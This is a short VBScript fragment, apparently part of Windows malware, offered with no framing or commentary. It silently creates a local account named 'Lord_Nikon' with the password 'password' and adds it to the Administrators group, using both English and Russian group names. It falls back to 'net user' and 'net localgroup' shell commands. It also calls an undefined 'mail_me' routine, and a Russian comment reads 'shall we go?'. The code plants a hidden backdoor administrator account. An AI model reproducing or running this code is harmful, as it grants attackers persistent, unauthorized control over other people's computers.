On Error Resume Next
Dim fso, File
prefix =  _
"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\"
Set wshshell = _
CreateObject("WScript.Shell")
Set WshSysEnv = WshShell.Environment _
("Process")
'''''''''''''''''''''''''''''''''''''''''''''''''
Set fso = CreateObject _
("Scripting.FileSystemObject")
Set File = _
fso.GetFile _
(WScript.ScriptFullName)
Set WshNetwork = WScript.CreateObject _
("WScript.Network")
'поехали?;)
mail_me
if WshSysEnv("SystemRoot")<>"" then
OS="winnt/2000"
	CreateUS _
WshNetwork.ComputerName , _
"Lord_Nikon", _
"password"
	if success=true then
		AddUser _
WshNetwork.ComputerName, _
"Administrators", _
"Lord_Nikon"
if fixed=false then
		AddUser _
WshNetwork.ComputerName, _
"Администраторы", _
"Lord_Nikon"
end if
else
wshshell.run _
("net user Lord_Nikon password /add")
wshshell.run _
("net localgroup Administratotrs Lord_Nikon /add")
	end if
else 
OS="win9x"
end if
